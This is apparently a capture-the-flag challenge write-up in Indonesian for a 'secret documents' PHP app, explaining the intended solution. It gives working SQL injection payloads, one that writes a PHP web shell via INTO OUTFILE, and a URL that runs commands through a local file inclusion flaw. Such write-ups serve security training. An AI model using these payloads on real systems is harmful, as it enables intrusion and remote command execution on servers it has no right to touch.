## Judul Soal
Dokumen Rahasia

## Deskripsi Soal
Saya sedang membuat aplikasi untuk menyimpan dokumen rahasia, coba tolong dicek keamanannya :) <br>

---

## Penjelasan Penyelesaian Soal
- Terdapat 2 vuln, yaitu SQLi dan LFI
- Untuk LFI, hanya bsa membaca file berekstensi .secret
- Tidak ada shell yang disediakan, peserta harus membuat shell sendiri
- Membuat shell menggunakan SQLi into outfile (dari login/register bebas lah)
- Sayangnya terdapat constraint `secure file priv` dari MySQL nya, jadi gk bsa sembarang create file
- Jadi harus cek dulu folder yang dibolehin pakai query (select @@global.secure_file_priv)
- Contoh payload: `' and 0 union select 1, @@global.secure_file_priv, '$2a$10$ogP8GlfK7F0BGTSe/ocS5eOVPU2zmVbgZQnVA5N64v6.OnT8wnPhy' -- -` (itu ada bcrypt karena verif passnya pke bcrypt) 
- Nanti bakal ketahuan folder yang bisa di-write itu `/tmp/heheboi`
- Yudh bikin shellnya pakai SQLi, misal filenya `shell.secret`
- Contoh payloadnya: `' and 0 union select '<?php system($_GET["c"]); ?>', 2, 3 into outfile '/tmp/heheboi/shell.secret' -- -`
- Setelah itu login dan akses lewat secret.php
- Contoh: `http://localhost:10003/secret.php?name=/tmp/heheboi/shell&c=cat%20/fl4g_adalah_sebuah_bendera`
- Done